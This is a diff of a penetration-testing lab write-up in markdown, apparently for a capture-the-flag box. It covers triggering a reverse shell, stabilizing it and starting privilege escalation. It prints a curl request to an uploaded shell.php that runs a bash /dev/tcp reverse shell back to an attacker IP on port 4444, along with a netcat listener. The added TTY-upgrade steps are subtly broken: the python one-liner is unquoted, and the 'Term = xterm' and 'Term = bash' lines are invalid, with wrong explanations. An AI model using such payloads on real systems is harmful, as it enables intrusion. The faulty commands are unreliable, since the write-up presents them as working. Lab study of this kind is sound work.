@@ -143,7 +143,29 @@ nc -nvlp 4444
 # Trigger reverse shell
 curl "http://192.168.1.81/uploads/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.145%2F4444%200%3E%261%27"
 ```
-- Shell stabilization processs was missed here:
+- Shell stabilization process:
+the `nc` (netcat) command is used for starting/setting up a port to listen for external tcp connections.
+using the `-nvlp` switch which specified the use of only ip addresses(n), verbose reports/error messages(v), in listen mode (l) for inbound connection requests, and finally (p) specifying the port number which in this case is `4444`.
+
+-Shell stabilization process was missed here:
+Terminal emulation refers to mimicking the behavior of a physical terminal (like a command-line interface) in software, letting users interact with a shell such as Bash through a session that supports features like command input, output display, and sometimes interactive applications. In the context of using Python to spawn a Bash shell, “terminal emulation” means making the Bash subprocess behave as if it is connected to a real terminal (TTY).[](https://www.jetbrains.com/help/pycharm/terminal-emulator.html)​
+
+## Terminal Emulation and Python
+
+- Launching Bash with Python’s `subprocess` module without terminal emulation means you only get simple communication, often limited to non-interactive command execution (such as running `ls`, but not using text editors).[](https://stackoverflow.com/questions/11634626/basic-terminal-emulation-in-python)​
+    
+- For **full terminal emulation**, you typically need to use Python’s `pty` (pseudoterminal) module, which creates a pseudo-terminal that allows interactive features and proper I/O handling, so things like shell prompts, autocompletion, and interactive programs work as expected.[](https://www.reddit.com/r/linuxquestions/comments/1mi3d7k/i_want_to_build_a_terminal_emulator_in_python/)​
+```
+python3 -c import pty; pty.spawn("/bin/bash")
+ctrl z 
+stty raw -echo; fg 
+Term = xterm
+Term = bash
+```
+`stty` - sets terminal terminal to "raw mode," which disables most input and output processing by the terminal driver. In raw mode, characters are passed directly to programs without line buffering, special character handling, or echoing. 
+`Term=xterm`- a terminal **emulator** program for the X Window System (a graphical environment on Unix/Linux). It emulates a physical terminal device, providing a window where text-based programs can run. It tells programs that the terminal supports the capabilities of an xterm emulator (e.g., how to control cursor movement, colors, etc.).
+`Term=bash`- ensures that the OS knows that a bash terminal is being used. 
+With all these, I am able to get a fully (or semi fully) interactive bash shell.
 - Privilege escalation pathway :
 since the other credentials in the first database did not work for ssh and ftp I tried to find another service that encapsulated the phrase - "Create Secure Sync between Web & FTP" from the `security.txt` file.
 I searched services that may not be obvious i.e., are not listening for external connections
